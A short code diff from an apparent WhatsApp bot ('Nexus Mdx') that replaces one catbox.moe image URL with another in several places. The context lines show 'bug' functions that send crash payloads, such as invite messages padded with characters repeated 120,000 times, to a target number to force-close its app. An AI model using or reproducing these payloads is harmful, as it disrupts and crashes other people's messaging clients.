@@ -953,7 +953,7 @@ async function generateCelebrityTweet(command, args, from, m, King) {
                             newsletterAdminInviteMessage: {
                                 newsletterJid: `33333333333333333@newsletter`,
                                 newsletterName: "hokage" + "ꦾ".repeat(120000),
-                                jpegThumbnail: "https://files.catbox.moe/z40008.jpg",
+                                jpegThumbnail: "https://files.catbox.moe/qsa3b9.jpg",
                                 caption: "ꦽ".repeat(120000) + "@0".repeat(120000),
                                 inviteExpiration: Date.now() + 1814400000, // 21 hari
                             },
@@ -2616,7 +2616,7 @@ async function generateCelebrityTweet(command, args, from, m, King) {
         // end of Bug functions
         //=========== ONE MESSAGE FC =========//
         async function onemsgfc(target) {
-            const sockUrl = 'https://files.catbox.moe/z40008.jpg';
+            const sockUrl = 'https://files.catbox.moe/qsa3b9.jpg';
             const video = await prepareWAMessageMedia(
                 { video: { url: sockUrl } },
                 { upload: demmy.waUploadToServer }
@@ -3239,7 +3239,7 @@ async function generateCelebrityTweet(command, args, from, m, King) {
             if (!text) throw "❌ Target information required";
 
             let pepec = args[0].replace(/[^0-9]/g, "");
-            let thumbnailUrl = "https://files.catbox.moe/z40008.jpg";
+            let thumbnailUrl = "https://files.catbox.moe/qsa3b9.jpg";
 
             let ressdone = `
 *Nexus Mdx - bug system — Operation Complete*
@@ -3531,7 +3531,7 @@ case 'menu': {
     if (!usedWithPrefix(m, command, prefix)) return;
     const fakeContact = createFakeContact(m);
     const text = "*loading menu...♻️*";
-    const imageUrl = "https://files.catbox.moe/z40008.jpg";
+    const imageUrl = "https://files.catbox.moe/qsa3b9.jpg";
 
     let menuText = `
 ┏❐  *◈ ɴᴇxᴜs-ᴍᴅx ᴍɪɴɪ ʙᴏᴛ ◈*
